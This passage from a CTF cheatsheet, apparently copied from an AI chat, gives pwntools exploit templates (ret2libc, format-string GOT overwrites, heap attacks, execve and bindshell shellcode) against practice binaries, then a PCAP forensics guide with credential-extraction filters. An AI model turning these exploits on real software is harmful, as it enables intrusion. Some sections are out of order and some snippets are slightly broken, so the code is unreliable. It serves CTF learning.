        })
    else:  # i386
        payload = flat({
            offset: [
                elf.plt['puts'],
                elf.symbols['main'],
                elf.got[func_name]
            ]
        })
    
    send_payload(payload)
    p.recvuntil(b'Thank you!\n')  # Adjust based on output
    
    leak = p.recv(6)  # Receive leaked bytes
    if elf.arch == 'amd64':
        leak = unpack_func(leak.ljust(8, b'\x00'))
    else:
        leak = unpack_func(leak.ljust(4, b'\x00'))
    
    return leak

# ==================== GDB Script ====================
gdbscript = '''
init-pwndbg
b *main+42
b *0x{elf.symbols.vuln:x}
continue
'''.format(**locals())

# ==================== Exploit ====================
def exploit():
    global p
    p = start()
    
    # === Stage 1: Find offset ===
    if args.FUZZ:
        for i in range(1, 200):
            try:
                p = start()
                p.sendline(b'A' * i)
                p.recvall(timeout=1)
                p.close()
            except EOFError:
                log.success(f'Potential offset: {i}')
                break
        return
    
    offset = 136  # Found offset
    
    # === Stage 2: Leak libc (if needed) ===
    if args.LEAK:
        libc = ELF(LIBC) if LIBC else elf.libc
        
        puts_leak = leak_address('puts')
        libc.address = puts_leak - libc.symbols['puts']
        log.success(f'Libc base: {hex(libc.address)}')
        
        # Get shell with libc
        system = libc.symbols['system']
        binsh = next(libc.search(b'/bin/sh'))
        
        if elf.arch == 'amd64':
            rop = ROP(elf)
            pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
            ret = rop.find_gadget(['ret'])[0]
            
            payload = flat({
                offset: [
                    ret,  # Stack alignment
                    pop_rdi,
                    binsh,
                    system
                ]
            })
        else:
            payload = flat({
                offset: [
                    system,
                    0xdeadbeef,  # Return address
                    binsh
                ]
            })
    else:
        # Simple ret2win
        payload = flat({
            offset: elf.symbols.get('win', 0x400800)
        })
    
    # === Stage 3: Send exploit ===
    send_payload(payload)
    
    # === Stage 4: Get shell ===
    p.interactive()

# ==================== Main ====================
if __name__ == '__main__':
    # Add command line arguments
    parser = argparse.ArgumentParser()
    parser.add_argument('--fuzz', action='store_true', help='Fuzz for offset')
    parser.add_argument('--leak', action='store_true', help='Leak libc addresses')
    args = parser.parse_args()
    
    exploit()
```

### Useful Pwntools Snippets

```python
# Shellcode generation
shellcode = asm(shellcraft.sh())  # Architecture aware
shellcode = asm("""
    xor rdi, rdi
    push rdi
    mov rdi, 0x68732f2f6e69622f
    push rdi
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 0x3b
    syscall
""")

# Format string automation
autofmt = FmtStr(execute_fmt)
offset = autofmt.offset
payload = fmtstr_payload(offset, {elf.got.puts: elf.symbols.win})

# Searching in binary
elf.search(b'/bin/sh')
libc.search(b'/bin/sh').next()

# ROP chain building
rop = ROP(elf)
rop.call('puts', [elf.got.puts])
rop.call('system', [binsh])
print(rop.dump())  # View chain

# Flat with symbols
payload = flat(
    b'A' * offset,
    elf.symbols.win,
    0xdeadbeef,
    0xcafebabe
)

# Working with sockets
p.recv()
p.recvline()
p.recvuntil(b'>')
p.recvall()
p.send(payload)
p.sendline(payload)
p.sendafter(b'>', payload)
p.sendlineafter(b'>', payload)

# Interactive helpers
p.interactive()
p.close()
p.wait_for_close()

# Debugging helpers
pause()  # Pause execution
log.info("Message")
log.success("Success!")
log.failure("Failed!")
log.warning("Warning!")
hexdump(data)
```

---

## 8. GDB Debugging

### Pwndbg Commands (Most Comprehensive)

```bash
# Display commands
telescope [addr] [count]    # Stack/memory dump with dereferences
hexdump [addr] [count]      # Hex dump memory
bins                        # Heap bins
heap                        # Heap overview
vis_heap_chunks            # Visual heap
vmmap                      # Virtual memory map
registers                  # All registers with colors
canary                     # Show stack canary
got                        # Display GOT
plt                        # Display PLT
checksec                   # Binary protections

# Analysis commands
cyclic 200                 # Generate cyclic pattern
cyclic -l 0x61616161      # Find offset
ropgadget                 # Find ROP gadgets
search /bin/sh            # Search memory
find [addr], [addr], "string"  # Search range
telescope $rsp 20         # View stack
context                   # Show full context
nearpc [addr]            # Instructions near address

# Breakpoints
b *$rebase(0x1234)       # PIE-aware breakpoint
tbreak *main+42          # Temporary breakpoint
catch syscall read       # Break on syscall
watch $rax               # Watchpoint on register
dq [addr]               # Display quad words

# Process control
piebase                  # Get PIE base
libc                    # Libc base address
procinfo                # Process information
aslr [on/off]           # Toggle ASLR
```

### GEF Commands

```bash
# GEF specific
gef config              # Configuration menu
pattern create 200      # Create pattern
pattern search $rsp     # Find pattern offset
checksec               # Security features
ropper --search "pop"  # Find gadgets
format-string-helper   # Format string helper
got                    # Global Offset Table
syscall-args          # Show syscall arguments
trace-run             # Trace execution
heap-analysis-helper  # Heap helper
```

### Advanced GDB Usage

```bash
# Set different syntaxes
set disassembly-flavor intel
set disassembly-flavor att

# Follow fork mode
set follow-fork-mode child
set follow-fork-mode parent

# Disable security
set disable-randomization on

# Logging
set logging on
set logging file gdb.log

# Conditional breakpoints
b *main+42 if $rax==0x1337

# Commands on breakpoint
b *main+42
commands
  silent
  printf "RAX = %p\n", $rax
  continue
end

# Tracing
catch syscall
catch signal SIGSEGV

# Display values continuously
display/i $pc
display/4gx $rsp
display/s 0x400800

# Modify memory/registers
set $rax = 0x1337
set {int}0x400800 = 0x90909090
set {char[4]}0x400800 = "TEST"

# Call functions from GDB
call puts("Hello from GDB")
print system("ls")

# Load symbols
symbol-file ./binary
add-symbol-file ./lib.so 0x7ffff7a00000

# Core dump analysis
gdb ./binary core
bt full                # Full backtrace
info registers all     # All registers
```

---

## 9. Common Exploit Scenarios

### Scenario 1: Simple Buffer Overflow (No Protections)

```python
from pwn import *

p = process('./vuln')
win = 0x401337

payload = b'A' * 64  # Buffer
payload += b'B' * 8  # RBP
payload += p64(win)  # Return address

p.sendline(payload)
p.interactive()
```

### Scenario 2: ret2libc with ASLR/NX

```python
from pwn import *

elf = ELF('./vuln')
libc = elf.libc
p = process('./vuln')

# Stage 1: Leak
rop = ROP(elf)
rop.puts(elf.got.puts)
rop.call(elf.symbols.main)

p.sendlineafter(b'>', flat({64: rop.chain()}))
leak = u64(p.recvline()[:6].ljust(8, b'\x00'))

# Stage 2: Calculate
libc.address = leak - libc.symbols.puts
log.success(f'Libc: {hex(libc.address)}')

# Stage 3: Exploit
rop2 = ROP(libc)
rop2.call('system', [next(libc.search(b'/bin/sh'))])

p.sendlineafter(b'>', flat({64: rop2.chain()}))
p.interactive()
```

### Scenario 3: Format String to GOT Overwrite

```python
from pwn import *

elf = ELF('./vuln')
p = process('./vuln')

# Find offset
def exec_fmt(payload):
    p.sendline(payload)
    return p.recvline()

autofmt = FmtStr(exec_fmt)
offset = autofmt.offset

# Overwrite GOT
payload = fmtstr_payload(offset, {elf.got.exit: elf.symbols.win})
p.sendline(payload)
p.interactive()
```

### Scenario 4: Heap Exploitation (UAF)

```python
from pwn import *

p = process('./vuln')

def alloc(size, data):
    p.sendlineafter(b'>', b'1')
    p.sendlineafter(b'Size:', str(size).encode())
    p.sendafter(b'Data:', data)

def free(idx):
    p.sendlineafter(b'>', b'2')
    p.sendlineafter(b'Index:', str(idx).encode())

def use(idx):
    p.sendlineafter(b'>', b'3')
    p.sendlineafter(b'Index:', str(idx).encode())

# Create UAF condition
alloc(0x20, b'A' * 0x20)  # Chunk 0
alloc(0x20, b'B' * 0x20)  # Chunk 1
free(0)
free(1)

# Exploit UAF
target = 0x401337
alloc(0x20, p64(target))  # Overwrite freed chunk
use(0)  # Trigger UAF

p.interactive()
```

---

## 10. Shellcoding

### x64 Shellcode Examples

```nasm
; execve("/bin/sh", NULL, NULL) - 27 bytes
xor rsi, rsi
push rsi
mov rdi, 0x68732f2f6e69622f
push rdi
push rsp
pop rdi
xor rdx, rdx
push 59
pop rax
syscall

; Read flag - assuming flag.txt
xor rsi, rsi
push rsi
mov rdi, 0x7478742e67616c66  ; flag.txt
push rdi
push rsp
pop rdi
xor rax, rax
mov al, 2  ; sys_open
syscall
mov rdi, rax
xor rax, rax  ; sys_read
mov rsi, rsp
mov dx, 0x100
syscall
mov al, 1  ; sys_write
mov rdi, 1
syscall
```

### x86 Shellcode Examples

```nasm
; execve("/bin/sh", NULL, NULL) - 23 bytes
xor ecx, ecx
push ecx
push 0x68732f2f
push 0x6e69622f
mov ebx, esp
xor eax, eax
mov al, 0xb
int 0x80

; Socket bindshell
xor ebx, ebx
mul ebx
push ebx
inc ebx
push ebx
push byte 0x2
mov ecx, esp
mov al, 0x66
int 0x80
```

### Shellcode Techniques

```python
# Avoiding bad characters
bad_chars = [b'\x00', b'\x0a', b'\x0d']
shellcode = asm(shellcraft.sh())

# Check for bad chars
for char in bad_chars:
    if char in shellcode:
        log.warning(f"Bad char {hex(ord(char))} found!")

# Encoding shellcode
encoded = encode(shellcode, avoid=b'\x00\x0a')

# Alphanumeric shellcode
alphanumeric = alphanumeric_encode(shellcode)

# Using msfvenom
os.system("msfvenom -p linux/x64/exec CMD=/bin/sh -f python -b '\\x00' -v shellcode")

# Using pwntools
context.arch = 'amd64'
shellcode = shellcraft.amd64.linux.sh()
encoded = asm(shellcode)
```

````

#### House of Orange (File Stream Exploitation)
```python
# Overwrite _IO_list_all to get shell
def house_of_orange():
    # Overflow top chunk size
    overflow(p64(0xc01))
    
    # Trigger malloc of larger size
    alloc(0x1000, b'trigger')  # Old top goes to unsorted bin
    
    # Craft fake _IO_FILE structure
    fake_file = b'/bin/sh\x00' + p64(0x61)
    fake_file += p64(0) + p64(io_list_all - 0x10)
    # ... more _IO_FILE fields
    fake_file += p64(system)  # vtable pointer
````

### Heap Debugging Commands

```bash
# Pwndbg heap commands
heap                    # Overview of all chunks
bins                   # Show all bins (tcache, fast, small, etc.)
vis_heap_chunks        # Visual representation
arena                  # Show arena information
tcache                 # Show tcache bins
fastbins              # Show fastbins
unsorted              # Show unsorted bin
smallbins             # Show small bins
largebins             # Show large bins

# Find specific chunks
find_fake_fast        # Find fake fast chunks
try_free [addr]       # Check if address can be freed

# Examine specific chunk
malloc_chunk [addr]   # Show chunk at address
heap_config           # Show heap configuration
```

---

## 12. Format String Exploitation

### Format String Basics

```c
// Vulnerable code patterns
printf(user_input);           // Direct format string
sprintf(buffer, user_input);  // Buffer format string
fprintf(file, user_input);    // File format string
syslog(LOG_INFO, user_input); // Syslog format string
```

### Format Specifiers

```
%s   - String (dereference pointer)
%x   - Hexadecimal
%d   - Decimal  
%n   - Write number of bytes printed to address
%p   - Pointer (leak addresses)
%c   - Character
%hn  - Write 2 bytes (short)
%hhn - Write 1 byte
%lln - Write 8 bytes (long long)
%10$x - Direct parameter access (10th parameter)
```

### Exploitation Techniques

#### Information Disclosure

```python
# Leak stack values
payload = b'%p ' * 20  # Leak 20 stack values

# Leak specific offset
payload = b'%10$p'  # Leak 10th parameter

# Leak string at address
payload = b'%s' + p64(target_addr)

# Find offset
for i in range(1, 50):
    payload = f'AAAA%{i}$x'.encode()
    # Look for 41414141
```

#### Arbitrary Write

```python
from pwn import *

# Basic write
def write_byte(addr, value):
    payload = f'%{value}c%10$hhn'.encode()
    payload += p64(addr)
    return payload

# Full address write
def write_address(where, what):
    payload = fmtstr_payload(offset, {where: what})
    return payload

# Manual construction
def manual_write():
    # Write 0x0804a024 to address 0x08049724
    writes = {
        0x08049724: 0x04,  # Byte 0
        0x08049725: 0xa0,  # Byte 1
        0x08049726: 0x04,  # Byte 2
        0x08049727: 0x08,  # Byte 3
    }
    
    payload = b''
    for addr, val in writes.items():
        payload += p32(addr)
    
    offset = 7  # Found offset
    current = 16  # Already printed bytes
    
    for addr, val in writes.items():
        if val > current:
            payload += f'%{val-current}c'.encode()
        elif val < current:
            payload += f'%{256+val-current}c'.encode()
        payload += f'%{offset}$hhn'.encode()
        current = val
        offset += 1
```

#### GOT Overwrite

```python
# Overwrite GOT entry
def got_overwrite():
    elf = ELF('./vuln')
    
    # Overwrite exit@got with win
    payload = fmtstr_payload(6, {
        elf.got.exit: elf.symbols.win
    })
    
    p.sendline(payload)
```

#### Format String Template

```python
#!/usr/bin/env python3
from pwn import *

elf = ELF('./vuln')
p = process('./vuln')

# Find offset automatically
def exec_fmt(payload):
    p.sendline(payload)
    return p.recvline()

autofmt = FmtStr(exec_fmt)
offset = autofmt.offset
log.info(f'Format string offset: {offset}')

# Create payload
writes = {
    elf.got.exit: elf.symbols.win,
    elf.got.puts: 0xdeadbeef
}

payload = fmtstr_payload(offset, writes)
p.sendline(payload)
p.interactive()
```

---

## 13. ROP & Advanced Techniques

### ROP Gadget Finding

```bash
# ROPgadget
ROPgadget --binary vuln --ropchain
ROPgadget --binary vuln --only "pop|ret"
ROPgadget --binary vuln --string "/bin/sh"
ROPgadget --binary vuln --memstr "/bin/sh"

# Ropper
ropper --file vuln --search "pop rdi"
ropper --file vuln --chain execve
ropper --file vuln --jmp rsp

# Using pwntools
rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
gadgets = rop.gadgets
```

### Common x64 Gadgets

```python
# Essential gadgets for x64
pop_rdi_ret = 0x400853  # First argument
pop_rsi_r15_ret = 0x400851  # Second argument
pop_rdx_ret = 0x400856  # Third argument
pop_rax_ret = 0x400857  # Syscall number
syscall_ret = 0x400858  # Syscall instruction
ret = 0x400859  # Stack alignment

# Building syscall manually
def build_execve_chain(binsh_addr):
    chain = p64(pop_rax_ret)
    chain += p64(59)  # sys_execve
    chain += p64(pop_rdi_ret)
    chain += p64(binsh_addr)
    chain += p64(pop_rsi_r15_ret)
    chain += p64(0) + p64(0)  # rsi=0, r15=junk
    chain += p64(pop_rdx_ret)
    chain += p64(0)
    chain += p64(syscall_ret)
    return chain
```

### ret2dlresolve

```python
# Advanced technique to call any function
from pwn import *

elf = ELF('./vuln')
rop = ROP(elf)
dlresolve = Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh'])

rop.read(0, dlresolve.data_addr)
rop.ret2dlresolve(dlresolve)

payload = fit({
    offset: rop.chain(),
    offset + len(rop.chain()): dlresolve.payload
})
```

### BROP (Blind ROP)

```python
# When you can't see the binary
def find_stop_gadget():
    """Find gadget that doesn't crash"""
    for i in range(0x400000, 0x401000):
        payload = b'A' * offset + p64(i)
        if not crashes(payload):
            return i

def find_brop_gadget():
    """Find BROP gadget (pop 6 registers + ret)"""
    for i in range(0x400000, 0x401000):
        payload = b'A' * offset
        payload += p64(i)
        payload += p64(0) * 6  # 6 pops
        payload += p64(stop_gadget)
        if not crashes(payload):
            return i
```

---

## 14. Quick Reference Tables

### x64 Syscall Table (Common)

|Syscall|Number|rdi|rsi|rdx|
|---|---|---|---|---|
|read|0|fd|buf|count|
|write|1|fd|buf|count|
|open|2|filename|flags|mode|
|close|3|fd|-|-|
|mprotect|10|addr|len|prot|
|execve|59|filename|argv|envp|
|exit|60|error_code|-|-|
|alarm|37|seconds|-|-|

### x86 Syscall Table (Common)

|Syscall|Number|ebx|ecx|edx|
|---|---|---|---|---|
|exit|1|status|-|-|
|read|3|fd|buf|count|
|write|4|fd|buf|count|
|open|5|filename|flags|mode|
|execve|11|filename|argv|envp|
|mprotect|125|addr|len|prot|

### Calling Conventions

```
x64 (System V AMD64 ABI):
Arguments: rdi, rsi, rdx, rcx, r8, r9, then stack
Return: rax
Caller-saved: rax, rcx, rdx, rsi, rdi, r8-r11
Callee-saved: rbx, rsp, rbp, r12-r15

x86 (cdecl):
Arguments: pushed right-to-left on stack
Return: eax
Caller cleans stack
```

### Common Addresses

```
32-bit:
Text segment: 0x08048000
Stack: 0xbfxxxxxx
Heap: 0x0804xxxx
Libc: 0xb7xxxxxx

64-bit:
Text segment: 0x400000
Stack: 0x7ffffffxxxxx
Heap: 0x602000
Libc: 0x7ffff7xxxxxx
```

---

## 15. CTF Strategy & Tips

### Challenge Approach Checklist

1. **Reconnaissance**
    
    - [ ] Run `file`, `checksec`, `strings`
    - [ ] Check for obvious win functions
    - [ ] Identify input methods
    - [ ] Test with simple inputs
2. **Vulnerability Identification**
    
    - [ ] Check for buffer overflows
    - [ ] Test format strings
    - [ ] Look for integer overflows
    - [ ] Check for race conditions
    - [ ] Analyze heap operations
3. **Exploit Development**
    
    - [ ] Find precise offsets
    - [ ] Identify required gadgets
    - [ ] Leak necessary addresses
    - [ ] Build ROP chains
    - [ ] Test locally first
4. **Remote Exploitation**
    
    - [ ] Adjust for remote environment
    - [ ] Handle network delays
    - [ ] Account for different libc
    - [ ] Add error handling

### Common Pitfalls & Solutions

|Problem|Solution|
|---|---|
|Stack alignment issues|Add `ret` gadget before system call|
|Can't find gadgets|Try partial overwrite or ret2dlresolve|
|ASLR breaking exploit|Add info leak stage|
|Exploit works locally but not remote|Check libc version, add delays|
|Format string offset wrong|Use automated tools or brute force|
|Can't leak libc|Try ret2plt or partial overwrite|
|Heap exploit unreliable|Check glibc version, adjust offsets|

### Speed Tips for CTFs

```python
# Quick template setup
from pwn import *
context.binary = elf = ELF('./chal')
p = remote('host', 1337) if args.REMOTE else process(elf.path)

# Common patterns
leak = lambda: u64(p.recv(6).ljust(8, b'\0'))
sla = lambda x, y: p.sendlineafter(x, y)
sa = lambda x, y: p.sendafter(x, y)

# Auto-find offset
io = process(elf.path)
io.sendline(cyclic(500))
io.wait()
core = io.corefile
offset = cyclic_find(core.read(core.rsp, 8))
```

### Essential One-Liners

```bash
# Get libc from Docker
docker cp container_id:/lib/x86_64-linux-gnu/libc.so.6 .

# Patch binary for testing
printf '\x90\x90' | dd of=binary bs=1 seek=$((0x1234)) conv=notrunc

# Quick server
socat TCP-LISTEN:1337,reuseaddr,fork EXEC:./vuln

# GDB follow child
echo "set follow-fork-mode child" > ~/.gdbinit

# Disable ASLR system-wide
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

### Final Pro Tips

1. **Always keep notes** - Document what works
2. **Save your exploits** - Build a personal library
3. **Automate common tasks** - Create helper scripts
4. **Version control** - Use git for exploit development
5. **Test incrementally** - Verify each stage works
6. **Read writeups** - Learn from others
7. **Practice regularly** - Use pwnable.kr, pwnable.tw
8. **Understand the theory** - Don't just copy-paste
9. **Join a team** - Collaborate and learn faster
10. **Have fun** - It's a game, enjoy it!

---

_Remember: This cheatsheet is for educational purposes and authorized CTF competitions only. Never use these techniques on systems you don't own or have explicit permission to test._

### Heap Structures

```c
// Chunk structure (malloc_chunk)
struct malloc_chunk {
    size_t mchunk_prev_size;  // Size of previous chunk (if free)
    size_t mchunk_size;        // Size of chunk | flags
    struct malloc_chunk* fd;   // Forward pointer (if free)
    struct malloc_chunk* bk;   // Backward pointer (if free)
};

// Flags
#define PREV_INUSE 0x1
#define IS_MMAPPED 0x2
#define NON_MAIN_ARENA 0x4
```

### Heap Techniques

#### Tcache Poisoning (glibc >= 2.26)

```python
# Poison tcache to get arbitrary allocation
def tcache_poison():
    # Fill tcache
    for i in range(7):
        alloc(0x20, b'A')
    
    # Free to tcache
    for i in range(7):
        free(i)
    
    # Overwrite tcache fd pointer
    edit(6, p64(target_addr))
    
    # Allocate to get target
    alloc(0x20, b'B')  # Normal chunk
    alloc(0x20, b'C')  # Target address!
```

#### Fastbin Dup (Double Free)

```python
# Classic fastbin double free
def fastbin_dup():
    alloc(0, 0x68, b'A')  # Chunk A
    alloc(1, 0x68, b'B')  # Chunk B
    
    free(0)  # Free A
    free(1)  # Free B (avoid double free check)
    free(0)  # Free A again (double free!)
    
    # Now fastbin: A -> B -> A
    alloc(2, 0x68, p64(target))  # Overwrite A's fd
    alloc(3, 0x68, b'D')
    alloc(4, 0x68, b'E')
    alloc(5, 0x68, b'WIN')  # Allocate at target!
```

#### Unsorted Bin Attack

```python
# Leak libc through unsorted bin
def unsorted_bin_leak():
    # Allocate and free large chunk
    alloc(0, 0x88, b'A')  # Goes to unsorted bin
    alloc(1, 0x18, b'B')  # Prevent consolidation
    
    free(0)
    
    # Leak fd/bk pointers (point to main_arena)
    view(0)
    leak = u64(p.recv(8))
    libc_base = leak - 0x3c4b78  # Offset to main_arena
    return libc_base
```

#### House of Spirit

```python
# Fake chunk on stack
def house_of_spirit():
    # Create fake chunk structure
    fake_chunk = p64(0)  # prev_size
    fake_chunk += p64(0x40)  # size (with PREV_INUSE)
    fake_chunk += b'A' * 0x38  # data
    
    # Next fake chunk (for size check)
    fake_chunk += p64(0)  # prev_size
    fake_chunk += p64(0x1234)  # size
    
    # Free the fake chunk
    free(stack_addr + 8)  # Point to fake chunk
    
    # Allocate to get stack control
    alloc(0, 0x38, b'CONTROL')
```

---

# PCAP

## Table of Contents

1. [Essential Tools & Setup](https://claude.ai/chat/ab588309-f670-4c13-a27a-f8ac17d925bf#essential-tools--setup)
2. [Initial Reconnaissance](https://claude.ai/chat/ab588309-f670-4c13-a27a-f8ac17d925bf#initial-reconnaissance)
3. [Protocol-Specific Analysis](https://claude.ai/chat/ab588309-f670-4c13-a27a-f8ac17d925bf#protocol-specific-analysis)
4. [Advanced Extraction Techniques](https://claude.ai/chat/ab588309-f670-4c13-a27a-f8ac17d925bf#advanced-extraction-techniques)
5. [Covert Channel Detection](https://claude.ai/chat/ab588309-f670-4c13-a27a-f8ac17d925bf#covert-channel-detection)
6. [Cryptography & Decryption](https://claude.ai/chat/ab588309-f670-4c13-a27a-f8ac17d925bf#cryptography--decryption)
7. [Forensic Analysis Techniques](https://claude.ai/chat/ab588309-f670-4c13-a27a-f8ac17d925bf#forensic-analysis-techniques)
8. [CTF-Specific Strategies](https://claude.ai/chat/ab588309-f670-4c13-a27a-f8ac17d925bf#ctf-specific-strategies)
9. [Automation & Scripting](https://claude.ai/chat/ab588309-f670-4c13-a27a-f8ac17d925bf#automation--scripting)
10. [Philippines Hack4Gov Specifics](https://claude.ai/chat/ab588309-f670-4c13-a27a-f8ac17d925bf#philippines-hack4gov-specifics)

---

## Essential Tools & Setup

### Core Analysis Tools

#### **Wireshark**

```bash
# Installation
sudo apt-get install wireshark
# Run with proper permissions
sudo wireshark capture.pcap

# Command line alternatives
wireshark -r capture.pcap -Y "http" -w http_only.pcap
wireshark -r capture.pcap -T fields -e ip.src -e ip.dst -E header=y
```

**Key Features:**

- Protocol dissectors for 3000+ protocols
- Customizable columns and color rules
- Stream reassembly
- Export capabilities
- Decryption support

#### **NetworkMiner**

```bash
# Linux setup with Mono
sudo apt-get install mono-runtime libmono-system-windows-forms4.0-cil
wget https://www.netresec.com/downloads/NetworkMiner.zip
unzip NetworkMiner.zip && cd NetworkMiner*
mono NetworkMiner.exe
```

**Extraction Capabilities:**

- Files (images, documents, executables)
- Credentials (plaintext/hashed)
- DNS queries and responses
- Sessions and parameters
- Host OS fingerprinting

#### **Tshark (Power User Tool)**

```bash
# Display filter examples
tshark -r capture.pcap -Y "tcp.flags.push==1"
tshark -r capture.pcap -Y "http.request.method==POST" -T json
tshark -r capture.pcap -Y "dns" -T fields -e dns.qry.name -e dns.a

# Statistics
tshark -r capture.pcap -qz io,stat,1
tshark -r capture.pcap -qz conv,tcp
tshark -r capture.pcap -qz http,tree
```

#### **TCPDump**

```bash
# Read and filter
tcpdump -r capture.pcap 'tcp[tcpflags] & (tcp-syn) != 0'
tcpdump -r capture.pcap -A 'port 80'  # ASCII output
tcpdump -r capture.pcap -XX 'host 192.168.1.1'  # Hex and ASCII

# Extract specific streams
tcpdump -r capture.pcap -w output.pcap 'tcp and port 443'
```

#### **Scapy (Python Framework)**

```python
from scapy.all import *

# Read pcap
packets = rdpcap("capture.pcap")

# Filter packets
http_packets = [p for p in packets if TCP in p and p[TCP].dport == 80]

# Extract data
for packet in packets:
    if packet.haslayer(Raw):
        print(packet[Raw].load)

# Modify and replay
for p in packets:
    if p.haslayer(IP):
        p[IP].src = "10.0.0.1"
wrpcap("modified.pcap", packets)
```

### Specialized Tools

#### **Zeek (formerly Bro)**

```bash
# Install and run
sudo apt-get install zeek
zeek -r capture.pcap

# Analyze logs
cat conn.log | zeek-cut id.orig_h id.resp_h proto
cat http.log | zeek-cut host uri user_agent
cat dns.log | zeek-cut query answers
```

#### **TCPFlow**

```bash
# Reconstruct TCP sessions
tcpflow -r capture.pcap
tcpflow -r capture.pcap -o output_dir

# With timestamp
tcpflow -r capture.pcap -T %T_%A_%a_%B_%b

# Extract HTTP bodies
tcpflow -r capture.pcap -e http
```

#### **Ngrep (Network Grep)**

```bash
# Pattern matching
ngrep -I capture.pcap 'flag'
ngrep -I capture.pcap -W byline 'POST'
ngrep -I capture.pcap -x 'flag'  # Hex search

# With context
ngrep -I capture.pcap -A 5 -B 5 'password'
```

#### **Chaosreader**

```bash
# Extract application data
perl chaosreader.pl capture.pcap
# Creates HTML report with sessions, images, etc.
```

---

## Initial Reconnaissance

### File Analysis

```bash
# Basic info
file capture.pcap
capinfos capture.pcap

# Detailed statistics
capinfos -T capture.pcap  # Tab-separated
capinfos -M capture.pcap  # Machine-readable

# Check for truncation
capinfos capture.pcap | grep "Packet size limit"

# Time analysis
capinfos -a -e capture.pcap  # Start and end times
```

### Quick Wins Checklist

```bash
# 1. String extraction with context
strings -n 8 capture.pcap | grep -C 3 -i "flag\|pass\|user\|admin\|secret"
strings -el capture.pcap  # Little-endian UTF-16
strings -eb capture.pcap  # Big-endian UTF-16

# 2. Hex pattern search
hexdump -C capture.pcap | grep -i "666c6167"  # "flag" in hex
xxd capture.pcap | grep -i "70 61 73 73"     # "pass" in hex

# 3. File carving
foremost -i capture.pcap -o carved_files/
binwalk -e capture.pcap
scalpel capture.pcap -o scalpel_output/

# 4. Quick statistics
tshark -r capture.pcap -qz endpoints,ip
tshark -r capture.pcap -qz ptype,tree
tshark -r capture.pcap -qz http_req,tree
```

### Network Mapping

```bash
# Extract all IPs
tshark -r capture.pcap -T fields -e ip.src -e ip.dst | tr '\t' '\n' | sort -u > ips.txt

# Find internal networks
grep -E "^(10\.|172\.(1[6-9]|2[0-9]|3[01])\.|192\.168\.)" ips.txt

# Port scanning evidence
tshark -r capture.pcap -Y "tcp.flags.syn==1 && tcp.flags.ack==0" -T fields -e ip.dst -e tcp.dstport | sort -u

# Service identification
tshark -r capture.pcap -T fields -e tcp.dstport -e udp.dstport | tr '\t' '\n' | sort -n | uniq -c | sort -rn
```

---

## Protocol-Specific Analysis

### HTTP/HTTPS Analysis

#### HTTP Traffic Extraction

```bash
# All HTTP methods
tshark -r capture.pcap -Y http -T fields -e http.request.method | sort | uniq -c

# POST requests with data
tshark -r capture.pcap -Y "http.request.method==POST" -T fields -e http.host -e http.request.uri -e http.file_data

# Cookies
tshark -r capture.pcap -Y "http.cookie" -T fields -e http.host -e http.cookie

# User agents (for enumeration)
tshark -r capture.pcap -Y http.user_agent -T fields -e http.user_agent | sort -u

# Response codes
tshark -r capture.pcap -Y http.response -T fields -e http.response.code -e http.response.phrase | sort | uniq -c

# Extract all URLs
tshark -r capture.pcap -Y http.request -T fields -e http.host -e http.request.uri | awk '{print "http://"$1$2}'

# File uploads
tshark -r capture.pcap -Y "http.content_type contains multipart" -T fields -e http.file_data > uploads.txt
```

#### HTTPS/TLS Analysis

```bash
# TLS handshake info
tshark -r capture.pcap -Y "tls.handshake.type==1" -T fields -e tls.handshake.extensions_server_name

# Cipher suites
tshark -r capture.pcap -Y "tls.handshake.type==2" -T fields -e tls.handshake.ciphersuite

# Certificates
tshark -r capture.pcap -Y "tls.handshake.certificate" -T fields -e x509ce.dNSName

# TLS versions
tshark -r capture.pcap -Y tls -T fields -e tls.record.version | sort -u
```

### DNS Analysis

```bash
# All DNS queries
tshark -r capture.pcap -Y "dns.flags.response==0" -T fields -e frame.time -e ip.src -e dns.qry.name

# DNS responses with IPs
tshark -r capture.pcap -Y "dns.flags.response==1 and dns.a" -T fields -e dns.qry.name -e dns.a

# TXT records (often used for data exfiltration)
tshark -r capture.pcap -Y "dns.txt" -T fields -e dns.qry.name -e dns.txt

# Suspicious long domain names (possible tunneling)
tshark -r capture.pcap -Y "dns.qry.name.len > 50" -T fields -e dns.qry.name

# MX records
tshark -r capture.pcap -Y "dns.qry.type==15" -T fields -e dns.qry.name -e dns.mx.mail_exchange

# Zone transfers
tshark -r capture.pcap -Y "dns.qry.type==252" -T fields -e ip.src -e ip.dst -e dns.qry.name
```

### FTP Analysis

```bash
# FTP commands
tshark -r capture.pcap -Y "ftp.request.command" -T fields -e ftp.request.command -e ftp.request.arg

# FTP responses
tshark -r capture.pcap -Y "ftp.response.code" -T fields -e ftp.response.code -e ftp.response.arg

# Extract credentials
tshark -r capture.pcap -Y "ftp.request.command==USER or ftp.request.command==PASS" -T fields -e ftp.request.command -e ftp.request.arg

# File operations
tshark -r capture.pcap -Y "ftp.request.command==RETR or ftp.request.command==STOR" -T fields -e ftp.request.arg

# Reconstruct FTP data
tcpflow -r capture.pcap 'port 20'
```

### Email Protocols (SMTP/POP3/IMAP)

```bash
# SMTP analysis
tshark -r capture.pcap -Y "smtp" -T fields -e smtp.req.command -e smtp.req.parameter
tshark -r capture.pcap -Y "smtp.data.fragment" -T fields -e smtp.data.fragment

# Extract email addresses
tshark -r capture.pcap -Y "smtp" -Vx | grep -E "MAIL FROM|RCPT TO"

# POP3 credentials
tshark -r capture.pcap -Y "pop.request.command==USER or pop.request.command==PASS" -T fields -e pop.request.command -e pop.request.parameter

# IMAP commands
tshark -r capture.pcap -Y "imap" -T fields -e imap.request -e imap.response
```

### Database Protocols

```bash
# MySQL
tshark -r capture.pcap -Y "mysql" -T fields -e mysql.query
tshark -r capture.pcap -Y "mysql.user" -T fields -e mysql.user -e mysql.passwd

# PostgreSQL
tshark -r capture.pcap -Y "pgsql" -T fields -e pgsql.query

# MongoDB
tshark -r capture.pcap -Y "mongo" -T fields -e mongo.query

# Redis
tshark -r capture.pcap -Y "tcp.port==6379" -z follow,tcp,ascii,0
```

### VoIP/SIP Analysis

```bash
# SIP messages
tshark -r capture.pcap -Y "sip" -T fields -e sip.Method -e sip.Request-Line

# Extract phone numbers
tshark -r capture.pcap -Y "sip" -T fields -e sip.From -e sip.To

# RTP streams
